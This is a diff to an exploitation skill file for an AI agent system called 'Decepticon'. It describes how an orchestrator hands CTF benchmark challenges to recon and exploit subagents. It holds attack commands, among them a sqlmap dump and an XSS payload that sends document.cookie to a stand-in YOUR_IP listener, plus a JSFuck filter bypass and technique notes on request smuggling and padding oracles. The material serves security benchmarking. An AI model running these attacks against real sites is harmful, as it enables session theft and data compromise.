@@ -10,8 +10,18 @@ metadata:
 
 # Benchmark — CTF Exploitation Reference
 
+## Main Agent (Orchestrator) Delegation
+
+The Decepticon orchestrator's role when running a benchmark challenge:
+1. Read this skill and the challenge tags from the system context
+2. Build an OPPLAN with two objectives: `RECON` and `INITIAL_ACCESS`
+3. Delegate `RECON` to the **recon subagent** first — it maps endpoints, finds injection points, identifies the win condition pattern
+4. Delegate `INITIAL_ACCESS` to the **exploit subagent** based on vulnerability tags — it loads `/skills/exploit/web/<tag>.md` and executes the attack
+5. Do NOT run bash exploitation directly from the orchestrator — delegate to subagents via `task()`
+
+Sub-agents read their own tag-specific skill files (e.g., `/skills/exploit/web/xss.md`).
+
 This skill provides vulnerability-to-technique mapping for CTF benchmark challenges.
-Sub-agents (recon, exploit) should load this skill for challenge context.
 
 ## Vulnerability Tag → Technique Mapping
 
@@ -32,8 +42,13 @@ Sub-agents (recon, exploit) should load this skill for challenge context.
 | `file_upload` | `/skills/exploit/web/file-upload.md` | Upload webshell with bypass |
 | `deserialization` | `/skills/exploit/web/deserialization.md` | Check for serialized data |
 | `cve` | — | Identify the service/version, search for known CVE exploits |
+| `race_condition` | — | TOCTOU exploitation, concurrent request flooding (use `xargs -P` or `curl` in parallel) |
+| `crypto` | — | Padding oracle attack, weak ciphers, IV reuse — test with padding oracle tools |
+| `smuggling_desync` | — | HTTP request smuggling: CL.TE, TE.CL, TE.TE desync; front-end/back-end pipeline attacks |
 
 **Multiple tags?** Tags are hints — try the most specific technique first (sqli > xss > ssti > lfi), then use supporting tags (idor, jwt, default_credentials) for context.
+
+**XSS tag note**: Before attacking, determine win condition — Pattern A (bot/cookie) vs Pattern B (server-side alert/Cross series). See `/skills/exploit/web/xss.md` Win Condition section.
 
 ## Recon Phase Guidance
 
@@ -86,17 +101,19 @@ sqlmap -u "$TARGET/endpoint?param=value" --batch --dump --level=3 --risk=2
 
 ### xss
 ```bash
-# Find reflection point
-curl -s "$TARGET/" | grep -i "input\|form\|search\|comment"
+# STEP 1: Determine win condition — see /skills/exploit/web/xss.md Win Condition section
+curl -s "$TARGET/report" -o /dev/null -w "%{http_code}"   # 404 = Pattern B (Cross/server-side alert)
+
+# Pattern A (bot/cookie chain) — find reflection, start listener, inject, trigger bot
 curl -s "$TARGET/search?q=XSSTEST123" | grep XSSTEST123
-
-# Find bot/report endpoint
-curl -s "$TARGET/report" -v 2>&1
-curl -s "$TARGET/contact" -v 2>&1
-
-# Start listener, inject payload, trigger bot
 python3 -m http.server 8888 &
 # Inject: <script>fetch("http://YOUR_IP:8888/?c="+document.cookie)</script>
+
+# Pattern B (Cross/server-side alert — no bot, no cookie) — bypass filter, produce alert() in response
+curl -sg "$TARGET/page?name=abc" | grep -i "error_umbrella\|sorry"   # confirm alphanumeric filter
+# Use JSFuck (node pre-installed): npm install jsfuck
+# node -e "const {JSFuck}=require('./node_modules/jsfuck/jsfuck.js'); console.log(JSFuck.encode('alert(1)',false,true))"
+# Submit payload and grep response for FLAG{ or new_umbrella
 ```
 
 ### ssti (Django/Jinja2)
